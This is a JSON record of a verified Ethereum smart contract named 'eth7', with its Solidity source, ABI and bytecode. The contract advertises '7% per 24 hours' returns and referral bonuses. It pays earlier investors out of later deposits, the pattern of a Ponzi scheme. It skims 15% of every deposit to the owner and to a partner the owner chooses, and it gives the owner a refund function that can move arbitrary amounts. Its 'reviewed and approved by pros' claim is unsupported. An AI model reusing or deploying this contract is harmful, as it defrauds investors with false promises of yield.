{
  "address": "0xe1dddb24bcede3894019f6bbe67afed1465ba7b2",
  "chain": "ETH",
  "chainID": 1,
  "verifier": "etherscan.io",
  "commonName": "",
  "contractName": "eth7",
  "compilerVersion": "v0.4.25+commit.59dbf8f1",
  "optimization": true,
  "runs": "200",
  "evmVersion": "default",
  "sourceCode": "/**\n *Submitted for verification at Etherscan.io on 2018-10-13\n*/\n\npragma solidity ^0.4.25;\n\n/** \n * contract for eth7.space\n * GAIN 7% PER 24 HOURS (every 5900 blocks)\n * \n *  How to use:\n *  1. Send any amount of ether to make an investment\n *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)\n *  OR\n *  2b. Send more ether to reinvest AND get your profit at the same time\n *\n * \n *  5% for every deposit of your direct partners\n *  If you want to invite your partners to join our program ,They have to specify your ETH wallet in a \"DATA\" field during a deposit transaction.\n * \n * \n * RECOMMENDED GAS LIMIT: 70000\n * RECOMMENDED GAS PRICE: https://ethgasstation.info/\n *\n * Contract reviewed and approved by pros!\n**/\n\ncontract eth7{\n\n    address public owner;\n    address public partner;    \n    \n\tmapping (address => uint256) deposited;\n\tmapping (address => uint256) withdrew;\n\tmapping (address => uint256) refearned;\n\tmapping (address => uint256) blocklock;\n\n\tuint256 public totalDepositedWei = 0;\n\tuint256 public totalWithdrewWei = 0;\n\tuint256 public investorNum = 0;\n\n\n\tevent invest(address indexed beneficiary, uint amount);\n\n    constructor () public {\n        owner   = msg.sender;\n        partner = msg.sender;\n    }\n    \n    modifier onlyOwner {\n        require (msg.sender == owner, \"OnlyOwner methods called by non-owner.\");\n        _;\n    }    \n    \n    //if you want to be a partner, contact admin\n    function setPartner(address newPartner) external onlyOwner {\n        partner = newPartner;\n    }\n \n\n\tfunction() payable external {\n\t\temit invest(msg.sender,msg.value);\n\t\tuint256 admRefPerc = msg.value / 10;\n\t\tuint256 advPerc    = msg.value / 20;\n\n\t\towner.transfer(admRefPerc);\n\t\tpartner.transfer(advPerc);\n\n\t\tif (deposited[msg.sender] > 0) {\n\t\t\taddress investor = msg.sender;\n            // calculate profit amount as such:\n            // amount = (amount invested) * 7% * (blocks since last transaction) / 5900\n            // 5900 is an average block count per day produced by Ethereum blockchain\n            uint256 depositsPercents = deposited[msg.sender] * 7 / 100 * (block.number - blocklock[msg.sender]) /5900;\n\t\t\tinvestor.transfer(depositsPercents);\n\n\t\t\twithdrew[msg.sender] += depositsPercents;\n\t\t\ttotalWithdrewWei += depositsPercents;\n\t\t\tinvestorNum++;\n\t\t}\n\n\t\taddress referrer = bytesToAddress(msg.data);\n\t\tif (referrer > 0x0 && referrer != msg.sender) {\n\t\t    referrer.transfer(admRefPerc);\n\t\t\trefearned[referrer] += admRefPerc;\n\t\t}\n\n\t\tblocklock[msg.sender] = block.number;\n\t\tdeposited[msg.sender] += msg.value;\n\t\ttotalDepositedWei += msg.value;\n\t}\n\t\n\t//refund to user who misunderstood the game . 'withdrew' must = 0\n    function reFund(address exitUser, uint a) external onlyOwner returns (uint256) {\n        uint256 reFundValue = deposited[exitUser];\n        exitUser.transfer(a);\n        deposited[exitUser] = 0;\n        return reFundValue;\n    }\n    \n\tfunction userDepositedWei(address _address) public view returns (uint256) {\n\t\treturn deposited[_address];\n    }\n\n\tfunction userWithdrewWei(address _address) public view returns (uint256) {\n\t\treturn withdrew[_address];\n    }\n\n\tfunction userDividendsWei(address _address) public view returns (uint256) {\n        return deposited[_address] * 7 / 100 * (block.number - blocklock[_address]) / 5900;\n    }\n\n\tfunction userReferralsWei(address _address) public view returns (uint256) {\n\t\treturn refearned[_address];\n    }\n\n\tfunction bytesToAddress(bytes bys) private pure returns (address addr) {\n\t\tassembly {\n\t\t\taddr := mload(add(bys, 20))\n\t\t}\n\t}\n}",
  "abi": "[{\"constant\":true,\"inputs\":[{\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"userDividendsWei\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"investorNum\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"newPartner\",\"type\":\"address\"}],\"name\":\"setPartner\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalWithdrewWei\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"partner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"userDepositedWei\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"exitUser\",\"type\":\"address\"},{\"name\":\"a\",\"type\":\"uint256\"}],\"name\":\"reFund\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalDepositedWei\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"userReferralsWei\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"userWithdrewWei\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"beneficiary\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"invest\",\"type\":\"event\"}]",
  "bytecode": "608060405260006006556000600755600060085534801561001f57600080fd5b506000805433600160a060020a0319918216811783556001805490921617905561073890819061004f90396000f3006080604052600436106100ae5763ffffffff7c01000000000000000000000000000000000000000000000000000000006000350416631b68adff8114610307578063544b255a1461033a5780638da5cb5b1461034f578063a16d596014610380578063b781e47d146103a3578063be10862b146103b8578063c8d1c6cf146103cd578063e557498b146103ee578063ee12d4f214610412578063ee1596e514610427578063fc4fcc5a14610448575b600080600080600033600160a060020a03167fb9b8c2461485ea1cc7d37d2326748846e4e65a93a395281a0a9c742764449982346040518082815260200191505060405180910390a260008054604051600a349081049850601490049650600160a060020a03909116916108fc881502918891818181858888f1935050505015801561013e573d6000803e3d6000fd5b50600154604051600160a060020a039091169085156108fc029086906000818181858888f19350505050158015610179573d6000803e3d6000fd5b503360009081526002602052604081205411156102195733600081815260056020908152604080832054600290925280832054905193965061170c4392909203606460079092029190910402049350849184156108fc0291859190818181858888f193505050501580156101f1573d6000803e3d6000fd5b5033600090815260036020526040902080548301905560078054830190556008805460010190555b6102536000368080601f01602080910402602001604051908101604052809392919081815260200183838082843750610469945050505050565b9050600081600160a060020a03161180156102775750600160a060020a0381163314155b156102d257604051600160a060020a0382169086156108fc029087906000818181858888f193505050501580156102b2573d6000803e3d6000fd5b50600160a060020a03811660009081526004602052604090208054860190555b505033600090815260056020908152604080832043905560029091529020805434908101909155600680549091019055505050005b34801561031357600080fd5b50610328600160a060020a0360043516610470565b60408051918252519081900360200190f35b34801561034657600080fd5b506103286104b3565b34801561035b57600080fd5b506103646104b9565b60408051600160a060020a039092168252519081900360200190f35b34801561038c57600080fd5b506103a1600160a060020a03600435166104c8565b005b3480156103af57600080fd5b50610328610596565b3480156103c457600080fd5b5061036461059c565b3480156103d957600080fd5b50610328600160a060020a03600435166105ab565b3480156103fa57600080fd5b50610328600160a060020a03600435166024356105c6565b34801561041e57600080fd5b506103286106d0565b34801561043357600080fd5b50610328600160a060020a03600435166106d6565b34801561045457600080fd5b50610328600160a060020a03600435166106f1565b6014015190565b600160a060020a038116600090815260056020908152604080832054600290925282205461170c9143039060649060070204028115156104ac57fe5b0492915050565b60085481565b600054600160a060020a031681565b600054600160a060020a0316331461056757604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152602660248201527f4f6e6c794f776e6572206d6574686f64732063616c6c6564206279206e6f6e2d60448201527f6f776e65722e0000000000000000000000000000000000000000000000000000606482015290519081900360840190fd5b6001805473ffffffffffffffffffffffffffffffffffffffff1916600160a060020a0392909216919091179055565b60075481565b600154600160a060020a031681565b600160a060020a031660009081526002602052604090205490565b600080548190600160a060020a0316331461066857604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152602660248201527f4f6e6c794f776e6572206d6574686f64732063616c6c6564206279206e6f6e2d60448201527f6f776e65722e0000000000000000000000000000000000000000000000000000606482015290519081900360840190fd5b50600160a060020a03831660008181526002602052604080822054905190929185156108fc02918691818181858888f193505050501580156106ae573d6000803e3d6000fd5b50600160a060020a038416600090815260026020526040812055905092915050565b60065481565b600160a060020a031660009081526004602052604090205490565b600160a060020a0316600090815260036020526040902054905600a165627a7a723058200a64246e8f3ac8faea5cb78f96bff5401c97bb01434440ed7b7fbd2b0dd3e08a0029"
}